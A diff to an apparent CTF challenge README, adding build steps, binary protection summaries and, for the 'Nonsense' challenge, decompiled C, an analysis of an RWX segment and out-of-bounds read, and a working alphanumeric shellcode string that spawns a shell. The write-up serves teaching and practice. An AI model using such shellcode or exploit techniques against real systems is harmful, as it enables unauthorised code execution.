@@ -6,11 +6,29 @@
 docker-compose up --build -d
 ```
 
+(Optional) If you want to rebuild the challenges, check the `Makefile` and run:
+
+```
+make
+```
+
 ## Challenge
 
 ### 👻 BOF
 
 > buffer overflow
+
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+
+The same as the challenge last year and check out the awesome writeup [here](https://github.com/yuawn/ais3-2019-pre-exam#bof---139-solves).
 
 <details><summary>hack.py</summary>
 
@@ -42,6 +60,84 @@ r.interactive()
 ### 📃 Nonsense
 
 > alphanumeric shellcode, out of bounds
+
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX disabled
+PIE:      No PIE (0x400000)
+RWX:      Has RWX segments
+```
+
+#### Analysis
+
+- main
+
+Read the input in `unk_601100` and `unk_6010A0`, and then call `sub_400698`. If the return value is not zero it will take `unk_6010A0` as function pointer and call it.
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  Z5nobufv();
+  puts("Welcome to Rick and Morty's crazy world.");
+  puts("What's your name?");
+  read(0, &unk_601100, 0x10uLL);
+  puts("Rick's stupid nonsense catchphrase is \"wubba lubba dub dub\".");
+  puts("What's yours?");
+  read(0, &unk_6010A0, 0x60uLL);
+  if ( (unsigned int)sub_400698() )
+    ((void (*)(void))unk_6010A0)();    // run shellcode
+  else
+    puts("Ummm, that's totally nonsense.");
+  return 0LL;
+}
+```
+
+- sub_400698
+
+Check `unk_6010A0` contains only printable ASCII characters; in the meantime, check `byte_601040` "wubbalubbadubdub" string and it will cause out-of-bounds read. Dig into it. And you will find out that it will compare with `unk_601100` which you can control when it reads data out of bounds.
+
+```c
+__int64 sub_400698()
+{
+  int i; // [rsp+0h] [rbp-Ch]
+  int v2; // [rsp+4h] [rbp-8h]
+  int j; // [rsp+8h] [rbp-4h]
+
+  for ( i = 0; i <= 95; ++i )
+  {
+    if ( byte_6010A0[i] <= 31 )
+      return 0LL;
+    v2 = 1;
+    for ( j = 0; j <= 15; ++j )
+    {
+      if ( byte_6010A0[i + j] != byte_601040[j] )    // OOB read
+        v2 = 0;
+    }
+    if ( v2 )
+      return 1LL;
+  }
+  return 0LL;
+}
+```
+
+#### Vulnerability
+
+- the user input (`unk_601100` and `unk_6010A0`) are in RWX segment
+- out-of-bounds read in `sub_400698`
+
+#### Idea
+
+Write the alphanumeric shellcode (< 96 bytes) and leverage OOB read to bypass the check if you need it.
+
+You can see the available x86-64 instructions [here](https://nets.ec/Alphanumeric_shellcode) and construct the shellcode to get the shell. (there would be many ways to achieve it 😳)
+
+My solution based on the [shellcode](https://hama.hatenadiary.jp/entry/2017/04/04/190129) (60 bytes) with the modification to fix the address of “/bin/sh” and append the nonsense string at the end.
+
+**RR**Yh00AAX1A0hA004X1A4hA00AX1A8QX4**t**Pj0X40PZPjAX4znoNDnRYZnCXAwubbalubbadubdub
 
 <details><summary>hack.py</summary>
 
@@ -77,6 +173,16 @@ r.interactive()
 ### 🔫 Portal gun
 
 > return oriented programming, ret2libc
+
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
 
 <details><summary>hack.py</summary>
 
@@ -122,6 +228,16 @@ r.interactive()
 
 > out of bounds, GOT hijack
 
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+
 <details><summary>hack.py</summary>
 
 ```python
@@ -161,6 +277,16 @@ r.interactive()
 
 > format string
 
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      PIE enabled
+```
+
 <details><summary>hack.py</summary>
 
 ```python
@@ -194,6 +320,16 @@ r.interactive()
 ### 📦 Meeseeks box
 
 > use after free, tcache dup
+
+#### Protection
+
+```
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+```
 
 <details><summary>hack.py</summary>
 
